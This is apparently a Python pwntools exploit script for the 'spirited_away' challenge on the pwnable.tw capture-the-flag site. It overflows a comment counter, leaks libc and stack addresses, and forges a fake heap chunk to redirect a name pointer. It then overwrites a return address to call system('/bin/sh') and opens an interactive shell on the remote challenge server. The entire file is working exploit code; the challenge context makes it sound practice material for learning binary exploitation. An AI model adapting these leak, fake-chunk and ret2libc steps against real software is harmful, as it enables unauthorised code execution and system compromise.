import pwn
import time

LOCAL = 0
if LOCAL:
    p = pwn.process('./spirited_away_patched')
else:
    p = pwn.remote('chall.pwnable.tw', 10204)

libc = pwn.ELF('./libc_32.so.6', checksec=False)

for i in range(10):
    p.recvuntil('Please enter your name:')
    p.sendline('')
    p.recvuntil('Please enter your age:')
    p.sendline('1')
    p.recvuntil('Why did you came to see this movie?')
    p.sendline('')
    p.recvuntil('Please enter your comment:')
    p.sendline('')
    p.recvuntil('Would you like to leave another comment? <y/n>:')
    p.sendline('y')
    #time.sleep(1)

for i in range(90):
    p.recvuntil('Please enter your age:')
    p.sendline('1')
    p.recvuntil('Why did you came to see this movie?')
    p.sendline('')
    p.recvuntil('Would you like to leave another comment? <y/n>:')
    p.sendline('y')
    #time.sleep(1)

p.recvuntil('Please enter your name:')
p.sendline('test')
p.sendlineafter(b'Please enter your age:', b'1')
p.sendlineafter(b'Why did you came to see this movie?', b'dead') # 0x58
payload = b'A'*83

# leak libc
p.sendlineafter(b'Please enter your comment:', payload)
p.recvuntil(b'dead')
leaked = p.recv(4)
leaked = leaked.replace(b'\n', b'\x00')
leaked = pwn.u32(leaked)
libc.address = leaked - 0x1b0000
print("[+] Libc base: ", hex(libc.address))

# leak stack
#pwn.gdb.attach(p)#, gdbscript='b *0x804873e')
p.recvuntil('Would you like to leave another comment? <y/n>:')
p.sendline('y')
p.recvuntil('Please enter your name:')
p.sendline('test')
p.sendlineafter(b'Please enter your age:', b'1')
p.sendlineafter(b'Why did you came to see this movie?', b'B'*0x37) # 0x58
payload = b'A'*83 # overwrite pName
p.sendlineafter(b'Please enter your comment:', payload)
p.recvuntil(b'Reason: ' + b'B'*0x37 + b'\n')
leaked = p.recv(4)
leaked = pwn.u32(leaked)
print("[+] Stack leak: ", hex(leaked))
fake_chunk = leaked - 0x70

# overwrite pName
p.recvuntil('Would you like to leave another comment? <y/n>:')
p.sendline('y')
p.recvuntil('Please enter your name:')
p.sendline('test')
p.sendlineafter(b'Please enter your age:', b'1')
data_fake_chunk = pwn.p32(0x0)
data_fake_chunk += pwn.p32(0x41)
data_fake_chunk += b'\x00' * 0x3c
data_fake_chunk += pwn.p32(0x1009)
#pwn.gdb.attach(p, gdbscript='b *0x804868a')
p.sendlineafter(b'Why did you came to see this movie?', data_fake_chunk)#b'B'*0x37) # 0x58
payload = b'A'*84 + pwn.p32(fake_chunk + 0x8) # overwrite pName
payload += pwn.p32(0x0)
payload += pwn.p32(0x41)
p.sendlineafter(b'Please enter your comment:', payload)

#overwrite ret address
payload = b'A'*0x4c
payload += pwn.p32(libc.sym['system'])
payload += pwn.p32(0x0)
payload += pwn.p32(next(libc.search(b'/bin/sh\0')))
p.recvuntil('Would you like to leave another comment? <y/n>:')
p.sendline('y')
p.sendlineafter(b'Please enter your name:', payload)
p.sendlineafter(b'Please enter your age: ', b'1')
p.sendlineafter(b'Why did you came to see this movie? ', b'1')
p.sendlineafter(b'Please enter your comment: ', b'1')
p.interactive()
